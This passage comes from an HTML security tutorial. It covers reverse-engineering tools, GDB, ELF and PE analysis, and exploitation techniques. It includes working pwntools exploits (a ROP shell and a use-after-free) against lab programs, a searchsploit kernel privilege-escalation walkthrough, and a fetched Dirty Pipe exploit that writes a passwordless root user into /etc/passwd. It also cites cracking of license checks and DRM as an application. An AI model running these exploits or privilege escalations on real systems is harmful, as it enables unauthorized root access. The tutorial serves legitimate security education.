                • <code>wa jmp 0x401000</code> - Write assembly<br>
                • <code>w hello</code> - Write string<br><br>
                <strong>Visual mode:</strong><br>
                • <code>V</code> - Enter visual mode<br>
                • <code>VV</code> - Visual graph mode<br>
                • <code>p</code> - Cycle views<br>
                • <code>:</code> - Command mode</p>
            </div>

            <h3>Part 3: Binary Ninja - Modern RE Platform</h3>

            <p><strong>Binary Ninja</strong> (binja) is a modern, commercial reverse engineering platform with beautiful UI and powerful IL (Intermediate Language) analysis. It has a free "Cloud" version and paid Personal ($299) and Commercial ($3999) licenses.</p>

            <div class="code"># Download Binary Ninja:
# https://binary.ninja/

# Free options:
# • Binary Ninja Cloud (browser-based, limited)
# • Binary Ninja Personal (30-day trial)

# Install on Kali:
wget https://cdn.binary.ninja/installers/binaryninja_linux_demo.zip
unzip binaryninja_linux_demo.zip
cd binaryninja
./binaryninja

# Key features over Ghidra/r2:

# 1. Clean, modern UI
# No cluttered NSA-style interface

# 2. Multiple IL views:
#   - Disassembly (raw assembly)
#   - Low-Level IL (LLIL) - architecture-independent
#   - Medium-Level IL (MLIL) - variables, expressions
#   - High-Level IL (HLIL) - pseudo-C
#   - Pseudo-C (most readable)

# 3. Workflow:
# Open binary → Auto-analysis runs
# 
# Left panel: Function list
# Center: Disassembly/IL
# Right: Variable types, cross-references
# Bottom: Python console

# 4. IL example:
# Assembly view:
# 00401000  push    ebp
# 00401001  mov     ebp, esp
# 00401003  sub     esp, 0x20

# LLIL:
# push(ebp)
# ebp = esp
# esp = esp - 0x20

# MLIL:
# int32_t var_20

# HLIL:
# (empty - just stack setup)

# 5. Type system:
# Define struct:
# Right-click variable → Change Type → struct myStruct { int x; char* name; }
# Binary Ninja propagates type info everywhere!

# 6. Scripting (Python):
# View → Python Console

# Example: Find all calls to dangerous functions

import binaryninja as binja

dangerous_funcs = ["strcpy", "gets", "sprintf"]

for func in bv.functions:
    for call_site in func.call_sites:
        call_target = call_site.function.name
        if call_target in dangerous_funcs:
            print(f"Dangerous call at {hex(call_site.address)}: {call_target}")

# Output:
# Dangerous call at 0x401234: strcpy
# Dangerous call at 0x401567: gets

# Binary Ninja plugins:
# Tools → Manage Plugins

# Popular plugins:
# • SENinja (symbolic execution)
# • Binjago (Go reverse engineering)
# • Sourcery Pane (sync with source code)

# Limitations:
# • Expensive ($299-$3999)
# • Closed source
# • Smaller community than Ghidra

# Best for:
# • Professional reverse engineering
# • Companies with budget
# • Complex binaries needing IL analysis</div>

            <h3>Part 4: GDB Debugging - Runtime Analysis</h3>

            <p><strong>GDB</strong> (GNU Debugger) is THE standard Linux debugger. While Ghidra/r2/Binja analyze static binaries, GDB runs them and lets you control execution!</p>

            <div class="code"># GDB basics:

# Compile test program with debug symbols:
cat > test.c << 'EOF'
#include <stdio.h>

int add(int a, int b) {
    return a + b;
}

int main() {
    int x = 5;
    int y = 10;
    int result = add(x, y);
    printf("Result: %d\n", result);
    return 0;
}
EOF

gcc -g test.c -o test  # -g = include debug symbols

# Start GDB:
gdb ./test

# GDB commands:

# List source code:
(gdb) list

# Output:
# 3       int add(int a, int b) {
# 4           return a + b;
# 5       }
# 6
# 7       int main() {
# 8           int x = 5;
# 9           int y = 10;
# 10          int result = add(x, y);

# Set breakpoint:
(gdb) break main
# Breakpoint 1 at 0x401136: file test.c, line 8.

# Or by line number:
(gdb) break 10

# Or by address:
(gdb) break *0x401136

# Run program:
(gdb) run

# Output:
# Starting program: /root/test
# Breakpoint 1, main () at test.c:8
# 8           int x = 5;

# Step through code:
(gdb) next  # Execute one line (step over functions)
# 9           int y = 10;

(gdb) next
# 10          int result = add(x, y);

(gdb) step  # Step INTO function
# add (a=5, b=10) at test.c:4
# 4           return a + b;

# Print variables:
(gdb) print x
# $1 = 5

(gdb) print y
# $2 = 10

(gdb) print result
# $3 = 0  (not set yet)

# Continue execution:
(gdb) continue
# Result: 15
# [Inferior 1 (process 1234) exited normally]

# Examining memory:
(gdb) x/4x $rsp  # Examine 4 hex words at stack pointer
# 0x7fffffffe000: 0x00000000 0x00000001 0xffffe010 0x00007fff

(gdb) x/s 0x402000  # Examine string at address
# 0x402000: "Hello World"

# Modify variables:
(gdb) set variable x = 100

# Call functions:
(gdb) call printf("Debug message\n")
# Debug message

# Disassemble:
(gdb) disassemble main
# Dump of assembler code for function main:
#    0x0000000000401130 <+0>:     push   %rbp
#    0x0000000000401131 <+1>:     mov    %rsp,%rbp
#    0x0000000000401134 <+4>:     sub    $0x10,%rsp</div>

            <h4>GDB with PEDA/GEF/Pwndbg Extensions</h4>

            <div class="code"># GDB is powerful but ugly. Extensions make it beautiful!

# PEDA (Python Exploit Development Assistance):
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit

# GEF (GDB Enhanced Features):
wget -O ~/.gdbinit-gef.py -q https://gef.blah.cat/py
echo "source ~/.gdbinit-gef.py" >> ~/.gdbinit

# Pwndbg (Exploit Development):
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh

# Features these add:

# 1. Beautiful UI with colors
# • Registers displayed with colors (red = changed)
# • Stack view with annotations
# • Code context around current instruction

# 2. Exploit development commands:

# Find ROP gadgets:
(gdb) rop --search "pop rdi"
# 0x00401234: pop rdi; ret
# 0x00401567: pop rdi; pop rsi; ret

# Search for strings:
(gdb) searchmem "password"
# [stack] 0x7fffffffe100 0x7fffffffe110 "password123"

# Pattern create (find offset for buffer overflow):
(gdb) pattern create 200
# Generate: Aa0Aa1Aa2Aa3...

# After crash:
(gdb) pattern offset $rsp
# Offset: 72 (crash happens at byte 72)

# Check security features:
(gdb) checksec
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE

# Shellcode helpers:
(gdb) shellcode generate x64
# \x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff...

# Heap commands:
(gdb) heap chunks
# (shows all heap allocations)

(gdb) heap bins
# (shows freed chunks in bins)</div>

            <h3>Part 5: ELF Analysis (Linux Binaries)</h3>

            <div class="code"># ELF (Executable and Linkable Format) is Linux binary format

# File command (identify binary type):
file /bin/ls

# Output:
# /bin/ls: ELF 64-bit LSB executable, x86-64, version 1 (SYSV),
# dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
# BuildID[sha1]=1234567890abcdef, for GNU/Linux 3.2.0,
# stripped

# Key info:
# • ELF 64-bit (architecture)
# • LSB (little-endian)
# • dynamically linked (uses shared libraries)
# • stripped (no debug symbols)

# readelf - Display ELF structure:

# ELF header:
readelf -h /bin/ls

# Output:
# ELF Header:
#   Magic:   7f 45 4c 46 02 01 01 00
#   Class:                             ELF64
#   Data:                              2's complement, little endian
#   Entry point address:               0x5850

# Section headers:
readelf -S /bin/ls

# Output:
#   [Nr] Name              Type             Address           Offset
#   [ 0]                   NULL             0000000000000000  00000000
#   [13] .text             PROGBITS         0000000000003000  00003000
#   [14] .fini             PROGBITS         0000000000017008  00017008
#   [23] .data             PROGBITS         0000000000019000  00019000
#   [24] .bss              NOBITS           0000000000019100  00019100

# Sections explained:
# .text     → Executable code
# .data     → Initialized global variables
# .rodata   → Read-only data (strings, constants)
# .bss      → Uninitialized global variables
# .plt      → Procedure Linkage Table (dynamic linking)
# .got      → Global Offset Table (dynamic linking)

# Program headers (segments):
readelf -l /bin/ls

# Output:
# Program Headers:
#   Type           Offset             VirtAddr           PhysAddr
#   LOAD           0x0000000000000000 0x0000000000000000 0x0000000000000000
#   LOAD           0x0000000000003000 0x0000000000003000 0x0000000000003000
#   DYNAMIC        0x0000000000018000 0x0000000000018000 0x0000000000018000

# Symbol table (if not stripped):
readelf -s /bin/ls

# Output:
#    Num:    Value          Size Type    Bind   Vis      Ndx Name
#     55: 0000000000005850   123 FUNC    GLOBAL DEFAULT   13 main
#    123: 0000000000006500    45 FUNC    GLOBAL DEFAULT   13 read_file

# Dynamic section (imported libraries):
readelf -d /bin/ls

# Output:
#  0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
#  0x0000000000000001 (NEEDED)             Shared library: [libpthread.so.0]

# objdump - Disassemble binary:

objdump -d /bin/ls | less

# Output:
# 0000000000005850 <main>:
#     5850:       55                      push   %rbp
#     5851:       48 89 e5                mov    %rsp,%rbp
#     5854:       41 57                   push   %r15

# Disassemble specific function:
objdump -d /bin/ls | grep -A 20 "<main>:"

# Show all strings:
objdump -s /bin/ls | grep -i "password"

# strings - Extract printable strings:
strings /bin/ls

# Output:
# /lib64/ld-linux-x86-64.so.2
# libc.so.6
# __cxa_finalize
# __libc_start_main
# cannot access %s
# [...]

# ldd - Show dynamic library dependencies:
ldd /bin/ls

# Output:
#     linux-vdso.so.1 (0x00007ffff7fc9000)
#     libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7c00000)
#     /lib64/ld-linux-x86-64.so.2 (0x00007ffff7fcb000)

# ltrace - Trace library calls:
ltrace ls

# Output:
# strrchr("/bin/ls", '/')                = "/ls"
# malloc(120)                            = 0x5555555592a0
# opendir(".")                           = 0x555555559750
# readdir(0x555555559750)                = 0x555555559770
# strcmp(".", ".")                       = 0
# [...]

# strace - Trace system calls:
strace ls

# Output:
# execve("/bin/ls", ["ls"], 0x7fffffffde80 /* 20 vars */) = 0
# brk(NULL)                               = 0x555555559000
# openat(AT_FDCWD, ".", O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 3
# [...]</div>

            <h3>Part 6: PE Analysis (Windows Binaries)</h3>

            <div class="code"># PE (Portable Executable) is Windows binary format

# Install PE tools on Kali:
sudo apt install pev

# readpe - Display PE structure:
readpe malware.exe

# Output:
# PE File Header:
#   Machine: IMAGE_FILE_MACHINE_AMD64 (x64)
#   Number of sections: 5
#   Timestamp: 2026-01-08 10:30:00 UTC
#   Entry point: 0x1400
# 
# Optional Header:
#   Magic: PE32+ (64-bit)
#   Subsystem: Windows GUI
#   DLL Characteristics: 0x8160
#     - DYNAMIC_BASE (ASLR)
#     - NX_COMPAT (DEP)
#     - TERMINAL_SERVER_AWARE

# pesec - Check security features:
pesec malware.exe

# Output:
# ASLR:               Yes
# DEP/NX:             Yes
# SEH:                Yes
# CFG:                No
# SafeSEH:            No
# Signed:             No

# pestr - Extract strings:
pestr malware.exe

# Output:
# kernel32.dll
# VirtualAlloc
# CreateThread
# C:\Windows\System32\
# http://malicious-c2.com/beacon
# [...]

# pehash - Calculate hashes:
pehash malware.exe

# Output:
# MD5:     1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d
# SHA-1:   a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0
# SHA-256: abc123...

# pedis - Disassemble entry point:
pedis malware.exe

# Output:
# 0x1400: push   rbp
# 0x1401: mov    rbp, rsp
# 0x1404: sub    rsp, 0x20
# 0x1408: call   0x2000

# Use Ghidra for deeper PE analysis:
# Import PE → Ghidra auto-detects:
#   - Import Address Table (IAT)
#   - Export Address Table (EAT)
#   - Resources (icons, dialogs, strings)
#   - TLS callbacks
#   - Exception handlers

# Common PE sections:
# .text     → Code
# .data     → Initialized data
# .rdata    → Read-only data (import table, string literals)
# .bss      → Uninitialized data
# .rsrc     → Resources (icons, dialogs, bitmaps)
# .reloc    → Relocation table (for ASLR)

# Packed PE detection:
# If .text section has high entropy (7.5+) → likely packed

# Unpacking with UPX:
upx -d malware.exe -o malware_unpacked.exe

# If different packer:
# • Run in debugger, let it unpack itself
# • Dump memory after unpacking
# • Use automated unpackers (de4dot for .NET)</div>

            <div class="metaphor-box">
                <h4>🎉 You're a Reverse Engineering Expert!</h4>
                <p>You've mastered:<br><br>
                ✅ <strong>Ghidra:</strong> NSA's free RE suite, decompilation, scripting, project management<br>
                ✅ <strong>radare2:</strong> Command-line beast, disassembly, patching, portable analysis<br>
                ✅ <strong>Binary Ninja:</strong> Modern platform, IL analysis, clean UI<br>
                ✅ <strong>GDB:</strong> Runtime debugging, breakpoints, PEDA/GEF/Pwndbg extensions<br>
                ✅ <strong>ELF Analysis:</strong> Linux binaries, readelf, objdump, sections, segments<br>
                ✅ <strong>PE Analysis:</strong> Windows binaries, pev tools, security features<br><br>
                <strong>RE Workflow:</strong><br>
                1. <strong>Reconnaissance:</strong> file, strings, readelf/readpe, checksec<br>
                2. <strong>Static analysis:</strong> Ghidra/r2/Binja → understand logic<br>
                3. <strong>Dynamic analysis:</strong> GDB → observe runtime behavior<br>
                4. <strong>Exploitation:</strong> Find vulns, craft exploits, patch binaries<br><br>
                <strong>Real-world applications:</strong><br>
                • <strong>Malware analysis:</strong> Understand what virus/ransomware does<br>
                • <strong>Vulnerability research:</strong> Find 0-days in proprietary software<br>
                • <strong>Cracking:</strong> Bypass license checks, DRM, authentication<br>
                • <strong>Protocol RE:</strong> Reverse engineer network protocols<br>
                • <strong>Interoperability:</strong> Make closed-source software work with your tools<br>
                • <strong>CTFs:</strong> Reverse engineering challenges<br><br>
                <strong>Next steps:</strong><br>
                • Practice on crackmes.one (100+ challenges)<br>
                • Analyze real malware (use VM!)<br>
                • Learn x86/x64 assembly deeply<br>
                • Study common vulnerability patterns (buffer overflow, integer overflow, format string)<br>
                • Contribute to Ghidra/r2 plugins<br><br>
                Every binary is a puzzle waiting to be solved. You now have the tools! 🧩🔓</p>
            </div>
        </section>

        <!-- SECTION 7: Advanced Exploitation Techniques -->
        <section id="advanced-exploitation" class="section">
            <h2 class="section-title">Advanced Exploitation Techniques</h2>
            <p class="section-intro">You know buffer overflows from Bonus B1. Now we go DEEP: ROP chains (Return-Oriented Programming), heap exploitation, kernel exploits, and fuzzing. Modern binaries have defenses: DEP/NX (no code execution on stack), ASLR (randomized addresses), stack canaries (overflow detection), PIE (position-independent code). Simple stack smashing doesn't work anymore! Advanced exploitation bypasses ALL these protections. This section covers how modern exploits work, how attackers chain vulnerabilities, and how to find 0-days with fuzzing. By the end, you'll understand CVEs you see in the news!</p>

            <div class="metaphor-box">
                <h4>💡 Modern Exploitation = Chess, Not Checkers</h4>
                <p>Old-school exploitation (1990s-2000s):<br>
                1. Find buffer overflow<br>
                2. Overwrite return address<br>
                3. Point to shellcode on stack<br>
                4. Win!<br><br>
                Modern exploitation (2010s-now):<br>
                1. <strong>Stack canary blocks overflow</strong> → Leak canary first<br>
                2. <strong>DEP/NX prevents shellcode execution</strong> → Use ROP chains instead<br>
                3. <strong>ASLR randomizes addresses</strong> → Leak libc address, calculate offsets<br>
                4. <strong>PIE randomizes code</strong> → Leak code address too<br>
                5. Chain all these together → Win!<br><br>
                You can't just "overflow and win" anymore. Modern exploits are multi-stage puzzles requiring information leaks, gadget chaining, and creative thinking. It's beautiful! 🧩</p>
            </div>

            <h3>Part 1: ROP (Return-Oriented Programming)</h3>

            <h4>The Problem: DEP/NX Prevents Shellcode Execution</h4>

            <div class="info-box">
                <h4>What is DEP/NX?</h4>
                <p><strong>DEP</strong> (Data Execution Prevention - Windows) / <strong>NX</strong> (No-eXecute - Linux) marks memory pages as either writable OR executable, never both!<br><br>
                <strong>Traditional stack-based shellcode:</strong><br>
                1. Write shellcode to stack (writable memory)<br>
                2. Jump to stack<br>
                3. Execute shellcode<br><br>
                <strong>With NX enabled:</strong><br>
                Stack is writable but NOT executable → Segmentation fault!<br><br>
                <strong>Check if binary has NX:</strong><br>
                <code>checksec --file=./vuln</code><br>
                Output: <code>NX: NX enabled</code><br><br>
                <strong>Solution:</strong> Don't execute our own code. Instead, chain together existing executable code ("gadgets") to build exploitation!</p>
            </div>

            <h4>ROP Gadgets Explained</h4>

            <div class="code"># A "gadget" is a sequence of instructions ending in RET

# Example gadgets from libc:

# Gadget 1:
0x00401234: pop rdi ; ret

# Gadget 2:
0x00401567: pop rsi ; ret

# Gadget 3:
0x004018ab: pop rdx ; ret

# Gadget 4:
0x00405678: pop rax ; ret

# Gadget 5:
0x00408901: syscall ; ret

# Why gadgets work:
# 1. They're in .text section (executable!)
# 2. We control the stack (writable!)
# 3. RET instruction pops address from stack and jumps there
# 4. We can chain gadgets by placing their addresses on stack!

# ROP chain to call system("/bin/sh"):

# Goal:
# rdi = pointer to "/bin/sh"  (first argument)
# rsi = 0                     (second argument)
# rdx = 0                     (third argument)
# rax = 59                    (syscall number for execve)
# syscall

# Stack layout:
# [buffer padding]
# [address of "pop rdi; ret"]     ← return address (after overflow)
# [address of "/bin/sh"]          ← will be popped into rdi
# [address of "pop rsi; ret"]     ← after first gadget returns
# [0x0]                           ← will be popped into rsi
# [address of "pop rdx; ret"]
# [0x0]                           ← will be popped into rdx
# [address of "pop rax; ret"]
# [59]                            ← execve syscall number
# [address of "syscall"]          ← triggers execve!

# Execution flow:
# 1. Buffer overflow overwrites return address → points to first gadget
# 2. First gadget: pop rdi; ret
#    - Pops next stack value into rdi ("/bin/sh" address)
#    - Returns to next stack value (second gadget)
# 3. Second gadget: pop rsi; ret
#    - Pops 0 into rsi
#    - Returns to third gadget
# 4. ... continues ...
# 5. Final gadget: syscall
#    - Executes syscall with our controlled registers!
#    - Shell spawned! 🎉</div>

            <h4>Finding ROP Gadgets</h4>

            <div class="code"># Tool 1: ROPgadget (best tool!)

sudo apt install python3-ropgadget

# Find gadgets in binary:
ROPgadget --binary ./vuln

# Output (thousands of gadgets):
# 0x00401234 : pop rdi ; ret
# 0x00401567 : pop rsi ; ret
# 0x004018ab : pop rdx ; ret
# 0x00405678 : pop rax ; ret
# 0x00408901 : syscall
# [... 2000+ more gadgets ...]

# Find specific gadget:
ROPgadget --binary ./vuln --only "pop|ret"

# Find gadgets containing "rdi":
ROPgadget --binary ./vuln | grep rdi

# Find gadgets in libc (more gadgets!):
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6

# Tool 2: ropper

sudo apt install ropper

ropper --file ./vuln

# Interactive mode:
(ropper)> search pop rdi
# [INFO] Searching for gadgets: pop rdi

# 0x00401234: pop rdi; ret

(ropper)> search syscall
# 0x00408901: syscall; ret

# Tool 3: pwntools (Python library)

from pwn import *

elf = ELF('./vuln')
rop = ROP(elf)

# Automatically find gadgets:
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
print(f"pop rdi; ret → {hex(pop_rdi)}")

# Or use pwntools to build ROP chain automatically:
rop.call('system', ['/bin/sh'])
print(rop.dump())

# Pwntools assembles entire chain for you!</div>

            <h4>Example: Complete ROP Exploit</h4>

            <div class="code"># Vulnerable program (vuln.c):
cat > vuln.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vuln() {
    char buffer[64];
    read(0, buffer, 200);  // Buffer overflow!
}

int main() {
    vuln();
    return 0;
}
EOF

# Compile without stack canary, with NX:
gcc vuln.c -o vuln -fno-stack-protector -z execstack -no-pie
# Wait, we want NX enabled, not execstack!
gcc vuln.c -o vuln -fno-stack-protector -no-pie

# Verify NX enabled:
checksec --file=./vuln
# Output: NX: NX enabled

# Python exploit (exploit.py):
cat > exploit.py << 'EOF'
#!/usr/bin/env python3
from pwn import *

# Setup
elf = ELF('./vuln')
rop = ROP(elf)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process('./vuln')

# Find gadgets
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

# Build ROP chain
offset = 72  # Buffer size + saved RBP
payload = b'A' * offset

# Call system("/bin/sh")
# Need: rdi = address of "/bin/sh"
binsh = next(libc.search(b'/bin/sh'))  # Find "/bin/sh" in libc
system = libc.sym['system']

payload += p64(pop_rdi)       # pop rdi; ret
payload += p64(binsh)         # address of "/bin/sh"
payload += p64(system)        # call system()

# Send exploit
p.send(payload)

# Interact with shell
p.interactive()
EOF

chmod +x exploit.py
python3 exploit.py

# Output:
# [*] '/root/vuln'
#     Arch:     amd64-64-little
#     NX:       NX enabled
# [+] Starting local process './vuln': pid 12345
# [*] Switching to interactive mode
# $ whoami
# root
# $ 

# Shell spawned!</div>

            <h3>Part 2: Heap Exploitation</h3>

            <h4>Understanding the Heap</h4>

            <div class="info-box">
                <h4>Stack vs Heap</h4>
                <p><strong>Stack:</strong><br>
                • Fixed size (usually 8MB)<br>
                • Automatic allocation (local variables)<br>
                • LIFO (Last In, First Out)<br>
                • Fast<br><br>
                <strong>Heap:</strong><br>
                • Dynamic size (grows as needed)<br>
                • Manual allocation (malloc/new)<br>
                • Managed by heap allocator (glibc uses ptmalloc2)<br>
                • Slower but flexible<br><br>
                <strong>Why heap is juicy for exploitation:</strong><br>
                • Stores pointers (function pointers, vtables)<br>
                • Stores user data (passwords, session tokens)<br>
                • Metadata adjacent to user data (attack metadata!)<br>
                • Less protections than stack (no canaries)</p>
            </div>

            <h4>Heap Exploitation Techniques</h4>

            <div class="code"># Heap Vulnerability Types:

# 1. Use-After-Free (UAF)
# Accessing memory after it's been freed

void vulnerable() {
    char *ptr = malloc(100);
    free(ptr);
    strcpy(ptr, "data");  // Writing to freed memory!
}

# Exploitation:
# 1. Allocate object A
# 2. Free object A
# 3. Allocate object B (reuses A's memory!)
# 4. Use object A's old pointer
# 5. Actually modifies object B!

# Example:
struct User {
    char name[32];
    void (*print_greeting)();
};

User *user1 = malloc(sizeof(User));
user1->print_greeting = &normal_greeting;
free(user1);

// Allocate attack payload in same location
char *attack = malloc(sizeof(User));
strcpy(attack, "AAAAAAAA");  // Overwrite function pointer!
memcpy(attack + 32, &evil_function, 8);

// Call old pointer
user1->print_greeting();  // Calls evil_function!

# 2. Double Free
# Freeing same pointer twice

char *ptr = malloc(100);
free(ptr);
free(ptr);  // Double free!

# Exploitation:
# Corrupts heap metadata → arbitrary write primitive

# 3. Heap Overflow
# Overflow one chunk into adjacent chunk's metadata

# Heap chunk structure (glibc):
# +-------------------+
# | size | prev_size |  ← Metadata
# +-------------------+
# | user data         |  ← Your data
# |                   |
# +-------------------+
# | size | prev_size |  ← Next chunk's metadata
# +-------------------+

# Overflow attack:
char *chunk1 = malloc(100);
char *chunk2 = malloc(100);

// Overflow chunk1, overwrite chunk2's metadata
strcpy(chunk1, "A" * 100 + "\xff\xff\xff\xff");  // Corrupt size field!

free(chunk2);  // Frees wrong size → corruption

# 4. Heap Feng Shui
# Manipulating heap layout to place objects adjacently

# Goal: Place victim object after controlled object
# 1. Allocate many chunks
# 2. Free specific chunks to create holes
# 3. Allocate victim object (lands in hole)
# 4. Overflow from controlled object → victim

# Practical tools:

# Examine heap in GDB with pwndbg:
(gdb) heap chunks

# Output:
# Allocated chunk | PREV_INUSE
# Addr: 0x555555559000
# Size: 0x90 (including metadata)
# 
# Allocated chunk | PREV_INUSE
# Addr: 0x555555559090
# Size: 0x90

(gdb) heap bins

# Output:
# fastbins
# 0x20: 0x0
# 0x30: 0x555555559000 → 0x555555559050 → 0x0
# 
# unsorted_bin
# all: 0x5555555590a0 → 0x7ffff7facb78 (main_arena+88) ← 0x5555555590a0

# View chunk:
(gdb) x/40gx 0x555555559000

# Output:
# 0x555555559000: 0x0000000000000000  0x0000000000000091  ← size (0x91 = 144 bytes + flags)
# 0x555555559010: 0x4141414141414141  0x4141414141414141  ← user data
# [...]</div>

            <h4>Example: Use-After-Free Exploit</h4>

            <div class="code"># Vulnerable program (uaf.c):
cat > uaf.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct User {
    char name[32];
    void (*greet)();
};

void normal_greet() {
    printf("Hello!\n");
}

void admin_greet() {
    printf("Admin access granted!\n");
    system("/bin/sh");
}

int main() {
    struct User *user = malloc(sizeof(struct User));
    strcpy(user->name, "John");
    user->greet = normal_greet;
    
    free(user);  // Freed!
    
    // User input (attacker controlled!)
    char *evil = malloc(sizeof(struct User));
    read(0, evil, sizeof(struct User));  // Attacker writes data
    
    // Use freed pointer!
    user->greet();  // UAF vulnerability!
    
    return 0;
}
EOF

gcc uaf.c -o uaf -no-pie

# Exploit:
# 1. Program allocates user
# 2. Program frees user
# 3. Program allocates evil (reuses same memory!)
# 4. We write to evil (overwrites old user data)
# 5. Program calls user->greet() (points to our data!)

# Python exploit:
cat > uaf_exploit.py << 'EOF'
#!/usr/bin/env python3
from pwn import *

elf = ELF('./uaf')
p = process('./uaf')

# Find address of admin_greet
admin_greet = elf.sym['admin_greet']
log.info(f"admin_greet at: {hex(admin_greet)}")

# Build payload
# struct User layout:
#   char name[32]
#   void (*greet)()  ← offset 32
payload = b'A' * 32                    # Fill name field
payload += p64(admin_greet)            # Overwrite function pointer!

p.send(payload)
p.interactive()
EOF

python3 uaf_exploit.py

# Output:
# Admin access granted!
# $ whoami
# root</div>

            <h3>Part 3: Kernel Exploitation</h3>

            <div class="code"># Kernel exploits target the OS itself!
# Goal: Escalate from user → root

# Common kernel vulnerability types:

# 1. Buffer overflow in syscall
# 2. Race condition in driver
# 3. Use-after-free in kernel object
# 4. Integer overflow in memory allocation
# 5. NULL pointer dereference

# Kernel exploit flow:
# 1. Trigger vulnerability in kernel
# 2. Overwrite kernel memory
# 3. Hijack control flow
# 4. Execute payload in kernel mode
# 5. Elevate privileges (uid = 0)
# 6. Return to userspace as root!

# Finding kernel version:
uname -r

# Output:
# 5.15.0-52-generic

# Search for exploits:
searchsploit linux kernel 5.15

# Output:
# Linux Kernel 5.15.x - 'fs/io_uring.c' Local Privilege Escalation
# Linux Kernel 5.15.x - eBPF Verifier Vulnerability
# [...]

# Download exploit:
searchsploit -m 50808.c
gcc 50808.c -o exploit

# Run:
./exploit
# [+] Kernel exploit starting...
# [+] Triggering vulnerability...
# [+] Overwriting cred struct...
# [+] Escalating privileges...
# [+] Done!

whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)

# Note: Kernel exploits are highly version-specific!
# Exploit for 5.15.0-52 won't work on 5.15.0-53

# Building custom kernel exploits:

# 1. Find kernel bug (CVE or 0-day)
# 2. Understand vulnerability primitive:
#    - Arbitrary read?
#    - Arbitrary write?
#    - Code execution?
# 3. Locate kernel structures in memory:
#    - task_struct (process info)
#    - cred struct (credentials: uid, gid)
# 4. Overwrite cred→uid to 0
# 5. Return to userspace
# 6. Now running as root!

# Debugging kernel:
# 1. Setup QEMU VM with kernel debugging
# 2. Attach GDB to kernel
# 3. Set breakpoints in vulnerable syscall
# 4. Step through exploitation

# Example: DirtyPipe (CVE-2022-0847)
# Allows overwriting read-only files!

# Download exploit:
wget https://haxx.in/files/dirtypipez.c
gcc dirtypipez.c -o dirtypipe

# Run:
./dirtypipe /etc/passwd 0 'root2:x:0:0:root:/root:/bin/bash'

# This overwrites /etc/passwd!
# Added new root user: root2

su root2
# (no password needed, logged in as root)</div>

            <h3>Part 4: Fuzzing with AFL (American Fuzzy Lop)</h3>

            <div class="metaphor-box">
                <h4>💡 Fuzzing = Throwing Infinite Monkeys at Code</h4>
                <p>Imagine you have a program that parses images. How do you find bugs?<br><br>
                <strong>Manual testing:</strong> Try 10 images, find 0 bugs (boring)<br>
                <strong>Fuzzing:</strong> Try 10,000,000 mutated images, find 23 crashes! 🎯<br><br>
                <strong>Fuzzing workflow:</strong><br>
                1. Start with valid inputs (seed corpus)<br>
                2. Mutate inputs (flip bits, insert bytes, splice files)<br>
                3. Run program with mutated inputs<br>
                4. Monitor for crashes, hangs, memory corruption<br>
                5. Save crashing inputs<br>
                6. Repeat forever!<br><br>
                Fuzzing found: Heartbleed, Shellshock, countless browser bugs, Zoom RCE, and thousands more! It's THE way modern 0-days are discovered.</p>
            </div>

            <div class="code"># Install AFL++:
sudo apt install afl++

# Or build from source:
git clone https://github.com/AFLplusplus/AFLplusplus
cd AFLplusplus
make
sudo make install

# Verify:
afl-fuzz -h

# Example target program (vuln_parse.c):
cat > vuln_parse.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void parse(char *data) {
    char buffer[100];
    
    // Vulnerability: no bounds check!
    strcpy(buffer, data);
    
    printf("Parsed: %s\n", buffer);
}

int main(int argc, char **argv) {
    if (argc < 2) {
        printf("Usage: %s <file>\n", argv[0]);
        return 1;
    }
    
    FILE *f = fopen(argv[1], "r");
    if (!f) return 1;
    
    char data[1000];
    fread(data, 1, 1000, f);
    fclose(f);
    
    parse(data);
    
    return 0;
}
EOF

# Compile with AFL instrumentation:
afl-gcc vuln_parse.c -o vuln_parse

# Create seed corpus (valid inputs):
mkdir input
echo "valid data" > input/seed1.txt
echo "another valid input" > input/seed2.txt

# Create output directory:
mkdir output

# Start fuzzing!
afl-fuzz -i input -o output ./vuln_parse @@

# @@ = AFL replaces this with generated input file

# AFL interface shows:
# +------------------------------------------------------------+
# |        american fuzzy lop ++4.00c (vuln_parse)             |
# +------------------------------------------------------------+
# | process timing | overall results | cycle progress |        |
# |   run time : 0 days, 0 hrs, 5 min | total paths  : 234 |   |
# |  last new path : 0 days, 0 hrs, 4 min | uniq crashes : 12 |   |
# |  last uniq crash : 0 days, 0 hrs, 3 min | uniq hangs   : 0  |   |
# |   last uniq hang : none seen yet | cycles done  : 45 |    |
# | stage progress | map coverage | findings in depth |        |
# |  now processing : havoc | map density : 34.2% |           |
# |  stage execs : 15234/20000 | bits found : 4521 |           |
# +------------------------------------------------------------+

# Key metrics:
# • total paths: Unique execution paths found
# • uniq crashes: Different crashes discovered
# • map coverage: Code coverage achieved

# Check crashes:
ls output/crashes/

# Output:
# id:000000,sig:06,src:000002,op:havoc,rep:4
# id:000001,sig:11,src:000012,op:splice,rep:2
# [... more crashes ...]

# Reproduce crash:
./vuln_parse output/crashes/id:000000,sig:06,src:000002,op:havoc,rep:4

# Output:
# Segmentation fault (core dumped)

# Analyze with GDB:
gdb ./vuln_parse core

(gdb) bt
# #0  0x0000000000401234 in parse ()
# #1  0x4141414141414141 in ?? ()  ← Overwritten return address!

# Triage crashes:
afl-tmin -i output/crashes/id:000000... -o minimized.txt -- ./vuln_parse @@

# Minimizes crashing input to smallest form

# Advanced AFL usage:

# Multiple cores:
